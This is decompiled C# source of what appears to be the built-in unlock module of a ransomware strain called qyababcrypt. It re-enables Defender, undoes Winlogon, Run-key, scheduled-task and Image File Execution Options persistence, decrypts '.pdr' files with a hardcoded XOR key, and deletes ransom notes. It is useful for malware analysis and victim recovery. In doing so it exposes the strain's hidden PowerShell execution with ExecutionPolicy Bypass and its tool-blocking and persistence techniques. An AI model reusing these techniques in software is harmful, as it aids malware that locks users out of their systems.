using System;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;

namespace ns0
{
	// Token: 0x02000023 RID: 35
	public static class Unlock
	{
		// Token: 0x060000BE RID: 190 RVA: 0x0000A7F8 File Offset: 0x000089F8
		private static void RunCmd(string args)
		{
			try
			{
				Process process = Process.Start(new ProcessStartInfo
				{
					FileName = "cmd.exe",
					Arguments = "/c " + args,
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true
				});
				if (process != null)
				{
					process.WaitForExit(10000);
				}
			}
			catch
			{
			}
		}

		// Token: 0x060000BF RID: 191 RVA: 0x0000A868 File Offset: 0x00008A68
		private static void RunPowerShell(string command)
		{
			try
			{
				Process process = Process.Start(new ProcessStartInfo
				{
					FileName = "powershell.exe",
					Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command \"" + command.Replace("\"", "`\"") + "\"",
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true
				});
				if (process != null)
				{
					process.WaitForExit(15000);
				}
			}
			catch
			{
			}
		}

		// Token: 0x060000C0 RID: 192 RVA: 0x0000A8EC File Offset: 0x00008AEC
		public static void RestoreDefender()
		{
			try
			{
				Unlock.RunPowerShell("Set-MpPreference -DisableRealtimeMonitoring $false");
				Unlock.RunPowerShell("Set-MpPreference -DisableBehaviorMonitoring $false");
				Unlock.RunPowerShell("Set-MpPreference -DisableBlockAtFirstSeen $false");
				Unlock.RunPowerShell("Set-MpPreference -DisableIOAVProtection $false");
				Unlock.RunPowerShell("Set-MpPreference -DisablePrivacyMode $false");
				Unlock.RunPowerShell("Set-MpPreference -SignatureDisableUpdate $false");
				try
				{
					RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Policies\\Microsoft", true);
					if (registryKey != null)
					{
						registryKey.DeleteSubKeyTree("Windows Defender", false);
					}
				}
				catch
				{
				}
				try
				{
					RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender", true);
					if (registryKey2 != null)
					{
						registryKey2.DeleteSubKeyTree("MpEngine", false);
					}
				}
				catch
				{
				}
				try
				{
					RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender", true);
					if (registryKey3 != null)
					{
						registryKey3.DeleteSubKeyTree("Real-Time Protection", false);
					}
				}
				catch
				{
				}
				Unlock.RunCmd("sc config WinDefend start=auto");
				Unlock.RunCmd("sc config SecurityHealthService start=auto");
				Unlock.RunCmd("sc config MpsSvc start=auto");
				Unlock.RunCmd("sc config SharedAccess start=auto");
				Unlock.RunCmd("sc start WinDefend");
				Unlock.RunCmd("sc start SecurityHealthService");
				Unlock.RunCmd("sc start MpsSvc");
				Unlock.RunCmd("netsh advfirewall set allprofiles state on");
			}
			catch
			{
			}
		}

		// Token: 0x060000C1 RID: 193 RVA: 0x0000AA84 File Offset: 0x00008C84
		public static void RemovePersistence()
		{
			try
			{
				try
				{
					RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true);
					if (registryKey != null)
					{
						registryKey.SetValue("Shell", "explorer.exe");
					}
				}
				catch
				{
				}
				try
				{
					RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true);
					if (registryKey2 != null)
					{
						registryKey2.SetValue("Userinit", "C:\\Windows\\system32\\userinit.exe,");
					}
				}
				catch
				{
				}
				try
				{
					Process.Start(new ProcessStartInfo("cmd.exe", "/c schtasks /delete /tn \"\\Microsoft\\Windows\\WindowsUpdate\\svchost\" /f")
					{
						WindowStyle = ProcessWindowStyle.Hidden,
						CreateNoWindow = true
					});
				}
				catch
				{
				}
				try
				{
					Process.Start(new ProcessStartInfo("cmd.exe", "/c schtasks /delete /tn \"WindowsDefenderScan\" /f")
					{
						WindowStyle = ProcessWindowStyle.Hidden,
						CreateNoWindow = true
					});
				}
				catch
				{
				}
				string[] array = new string[] { "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce" };
				string[] array2 = new string[] { "WindowsSecurityHealth", "EdgeUpdate", "*WindowsInit", "WindowsDefenderService", "SystemBootManager" };
				foreach (string text in array)
				{
					try
					{
						using (RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey(text, true))
						{
							bool flag = registryKey3 != null;
							if (flag)
							{
								foreach (string text2 in array2)
								{
									try
									{
										registryKey3.DeleteValue(text2, false);
									}
									catch
									{
									}
								}
							}
						}
					}
					catch
					{
					}
					try
					{
						using (RegistryKey registryKey4 = Registry.LocalMachine.OpenSubKey(text, true))
						{
							bool flag2 = registryKey4 != null;
							if (flag2)
							{
								foreach (string text3 in array2)
								{
									try
									{
										registryKey4.DeleteValue(text3, false);
									}
									catch
									{
									}
								}
							}
						}
					}
					catch
					{
					}
				}
				string[] array6 = new string[] { "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" };
				foreach (string text4 in array6)
				{
					try
					{
						RegistryKey registryKey5 = Registry.CurrentUser.OpenSubKey(text4, true);
						bool flag3 = registryKey5 != null;
						if (flag3)
						{
							registryKey5.DeleteValue("DisableTaskMgr", false);
							registryKey5.DeleteValue("DisableCMD", false);
							registryKey5.DeleteValue("DisableRegistryTools", false);
							registryKey5.DeleteValue("NoRun", false);
							registryKey5.DeleteValue("NoClose", false);
							registryKey5.DeleteValue("DisableLockWorkstation", false);
							registryKey5.DeleteValue("DisableChangePassword", false);
							registryKey5.DeleteValue("NoLogoff", false);
							registryKey5.DeleteValue("HideFastUserSwitching", false);
							registryKey5.DeleteValue("NoRestart", false);
							registryKey5.DeleteValue("NoSleep", false);
						}
					}
					catch
					{
					}
					try
					{
						RegistryKey registryKey6 = Registry.LocalMachine.OpenSubKey(text4, true);
						bool flag4 = registryKey6 != null;
						if (flag4)
						{
							registryKey6.DeleteValue("DisableTaskMgr", false);
							registryKey6.DeleteValue("DisableCMD", false);
							registryKey6.DeleteValue("DisableRegistryTools", false);
							registryKey6.DeleteValue("NoRun", false);
							registryKey6.DeleteValue("NoClose", false);
							registryKey6.DeleteValue("DisableLockWorkstation", false);
							registryKey6.DeleteValue("DisableChangePassword", false);
							registryKey6.DeleteValue("NoLogoff", false);
							registryKey6.DeleteValue("HideFastUserSwitching", false);
							registryKey6.DeleteValue("NoRestart", false);
							registryKey6.DeleteValue("NoSleep", false);
						}
					}
					catch
					{
					}
				}
				try
				{
					RegistryKey registryKey7 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\System", true);
					bool flag5 = registryKey7 != null;
					if (flag5)
					{
						registryKey7.DeleteValue("DontDisplayNetworkSelectionUI", false);
					}
				}
				catch
				{
				}
				string[] array8 = new string[]
				{
					"cmd.exe", "powershell.exe", "pwsh.exe", "taskmgr.exe", "regedit.exe", "msconfig.exe", "mmc.exe", "control.exe", "eventvwr.exe", "perfmon.exe",
					"resmon.exe"
				};
				foreach (string text5 in array8)
				{
					try
					{
						RegistryKey registryKey8 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options", true);
						if (registryKey8 != null)
						{
							registryKey8.DeleteSubKey(text5, false);
						}
					}
					catch
					{
					}
				}
				try
				{
					RegistryKey registryKey9 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\WindowsPowerShell", true);
					if (registryKey9 != null)
					{
						registryKey9.SetValue("EnableScripts", 1);
					}
				}
				catch
				{
				}
				try
				{
					RegistryKey registryKey10 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\WindowsPowerShell", true);
					if (registryKey10 != null)
					{
						registryKey10.DeleteValue("DisableCommandLine", false);
					}
				}
				catch
				{
				}
				try
				{
					RegistryKey registryKey11 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\USBSTOR", true);
					if (registryKey11 != null)
					{
						registryKey11.SetValue("Start", 3);
					}
				}
				catch
				{
				}
				try
				{
					RegistryKey registryKey12 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\cdrom", true);
					if (registryKey12 != null)
					{
						registryKey12.SetValue("Start", 1);
					}
				}
				catch
				{
				}
			}
			catch
			{
			}
		}

		// Token: 0x060000C2 RID: 194 RVA: 0x0000B1BC File Offset: 0x000093BC
		public static void DecryptAllFilesAggressively()
		{
			try
			{
				string[] array = new string[]
				{
					Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
					Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads",
					Environment.GetFolderPath(Environment.SpecialFolder.Personal),
					Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
					Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Music"),
					Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Videos")
				};
				foreach (string text in array)
				{
					bool flag = Directory.Exists(text);
					if (flag)
					{
						Unlock.CrawlAndDecrypt(text);
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x060000C3 RID: 195 RVA: 0x0000B26C File Offset: 0x0000946C
		private static void CrawlAndDecrypt(string directory)
		{
			try
			{
				string text = directory.ToLower();
				bool flag = text.Contains("\\windows") || text.Contains("\\program files") || text.Contains("\\program files (x86)") || text.Contains("\\appdata") || text.Contains("$recycle.bin");
				if (!flag)
				{
					string[] files;
					try
					{
						files = Directory.GetFiles(directory);
					}
					catch
					{
						return;
					}
					foreach (string text2 in files)
					{
						try
						{
							bool flag2 = text2.EndsWith(".pdr");
							if (flag2)
							{
								Unlock.DecryptFile(text2);
							}
							else
							{
								bool flag3 = text2.EndsWith(".pdr.tmp");
								if (flag3)
								{
									string text3 = text2.Substring(0, text2.Length - ".pdr.tmp".Length);
									bool flag4 = !File.Exists(text3);
									if (flag4)
									{
										string text4 = text2.Substring(0, text2.Length - ".tmp".Length);
										bool flag5 = File.Exists(text4);
										if (flag5)
										{
											File.Delete(text4);
										}
										File.Move(text2, text4);
										Unlock.DecryptFile(text4);
									}
								}
							}
						}
						catch
						{
						}
					}
					string[] directories;
					try
					{
						directories = Directory.GetDirectories(directory);
					}
					catch
					{
						return;
					}
					foreach (string text5 in directories)
					{
						try
						{
							Unlock.CrawlAndDecrypt(text5);
						}
						catch
						{
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x060000C4 RID: 196 RVA: 0x0000B47C File Offset: 0x0000967C
		private static void DecryptFile(string filePath)
		{
			string text = filePath.Substring(0, filePath.Length - ".pdr".Length);
			string text2 = text + ".tmp";
			try
			{
				FileInfo fileInfo = new FileInfo(filePath);
				long length = fileInfo.Length;
				using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
				{
					using (FileStream fileStream2 = new FileStream(text2, FileMode.Create, FileAccess.Write, FileShare.None))
					{
						byte[] array = new byte[8192];
						long num = 0L;
						int num2;
						while ((num2 = fileStream.Read(array, 0, array.Length)) > 0)
						{
							for (int i = 0; i < num2; i++)
							{
								array[i] = (byte)(((int)(array[i] - 105) + 256) % 256);
								byte[] array2 = array;
								int num3 = i;
								checked
								{
									array2[num3] ^= Unlock.XOR_KEY[(int)((IntPtr)(unchecked((num + (long)i) % (long)Unlock.XOR_KEY.Length)))];
								}
							}
							fileStream2.Write(array, 0, num2);
							num += (long)num2;
						}
						fileStream2.Flush(true);
					}
				}
				bool flag = new FileInfo(text2).Length == length;
				if (flag)
				{
					bool flag2 = File.Exists(text);
					if (flag2)
					{
						File.Delete(text);
					}
					File.Move(text2, text);
					bool flag3 = File.Exists(filePath);
					if (flag3)
					{
						File.Delete(filePath);
					}
				}
				else
				{
					bool flag4 = File.Exists(text2);
					if (flag4)
					{
						File.Delete(text2);
					}
				}
			}
			catch
			{
				try
				{
					bool flag5 = File.Exists(text2);
					if (flag5)
					{
						File.Delete(text2);
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x060000C5 RID: 197 RVA: 0x0000B680 File Offset: 0x00009880
		public static void RemoveRansomNotes()
		{
			try
			{
				foreach (string text in Environment.GetLogicalDrives())
				{
					try
					{
						string text2 = Path.Combine(text, "!!!READ_ME!!!.txt");
						bool flag = File.Exists(text2);
						if (flag)
						{
							File.Delete(text2);
						}
					}
					catch
					{
					}
				}
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
				string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
				try
				{
					bool flag2 = File.Exists(Path.Combine(folderPath, "!!!READ_ME!!!.txt"));
					if (flag2)
					{
						File.Delete(Path.Combine(folderPath, "!!!READ_ME!!!.txt"));
					}
				}
				catch
				{
				}
				try
				{
					bool flag3 = File.Exists(Path.Combine(folderPath2, "!!!READ_ME!!!.txt"));
					if (flag3)
					{
						File.Delete(Path.Combine(folderPath2, "!!!READ_ME!!!.txt"));
					}
				}
				catch
				{
				}
			}
			catch
			{
			}
		}

		// Token: 0x060000C6 RID: 198 RVA: 0x0000B784 File Offset: 0x00009984
		public static void DoFullUnlock(main loader)
		{
			Unlock.RestoreDefender();
			Unlock.RemovePersistence();
			Unlock.DecryptAllFilesAggressively();
			try
			{
				bool flag = File.Exists(loader.string_4);
				if (flag)
				{
					File.Delete(loader.string_4);
				}
			}
			catch
			{
			}
			try
			{
				string tempPath = Path.GetTempPath();
				File.Delete(Path.Combine(tempPath, "qyabab_block.png"));
			}
			catch
			{
			}
			try
			{
				string tempPath2 = Path.GetTempPath();
				File.Delete(Path.Combine(tempPath2, "qyabab_show.vbs"));
			}
			catch
			{
			}
			try
			{
				bool flag2 = File.Exists(loader.string_5);
				if (flag2)
				{
					File.Delete(loader.string_5);
				}
			}
			catch
			{
			}
			try
			{
				bool flag3 = File.Exists(loader.string_6);
				if (flag3)
				{
					File.Delete(loader.string_6);
				}
			}
			catch
			{
			}
			try
			{
				bool flag4 = File.Exists(loader.string_8);
				if (flag4)
				{
					File.Delete(loader.string_8);
				}
			}
			catch
			{
			}
			Unlock.RemoveRansomNotes();
			try
			{
				try
				{
					string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers", "etc", "$decryption_done.flag");
					File.WriteAllText(text, DateTime.Now.ToString());
					File.SetAttributes(text, FileAttributes.Hidden | FileAttributes.System);
				}
				catch
				{
				}
				try
				{
					string text2 = Path.Combine(Path.GetTempPath(), "$qyababcrypt_decryption_done.flag");
					File.WriteAllText(text2, DateTime.Now.ToString());
					File.SetAttributes(text2, FileAttributes.Hidden | FileAttributes.System);
				}
				catch
				{
				}
				try
				{
					string text3 = Path.Combine(Path.GetTempPath(), "$qyababcrypt_decryption_in_progress.flag");
					bool flag5 = File.Exists(text3);
					if (flag5)
					{
						File.Delete(text3);
					}
				}
				catch
				{
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400007B RID: 123
		private static readonly byte[] XOR_KEY = new byte[] { 19, 55, 222, 173 };

		// Token: 0x0400007C RID: 124
		private const string ENCRYPTED_EXT = ".pdr";
	}
}
